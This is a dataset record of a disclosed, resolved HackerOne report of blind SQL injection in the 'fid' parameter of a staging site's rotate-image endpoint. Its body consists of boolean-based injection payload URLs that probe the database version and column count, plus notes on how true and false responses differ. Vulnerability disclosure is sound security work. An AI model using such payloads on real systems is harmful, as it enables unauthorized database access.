---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '23014'
original_report_id: '23014'
title: SQL Injection
weakness: SQL Injection
team_handle: uzbey
created_at: '2014-08-08T04:22:29.483Z'
disclosed_at: '2014-11-02T19:39:08.504Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- sql-injection
---

# SQL Injection

## Metadata

- HackerOne Report ID: 23014
- Weakness: SQL Injection
- Program: uzbey
- Disclosed At: 2014-11-02T19:39:08.504Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

https://staging.uzbey.com/rotate-image?fid=2841+and+substring(version(),1,1)=4 FALSE
https://staging.uzbey.com/rotate-image?fid=2841+and+substring(version(),1,1)=5 TRUE

https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+1-- TRUE
https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+2-- FALSE

FALSE = will redirect to access denied
TRUE = redirected to page not found

fid must be a valid image id

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
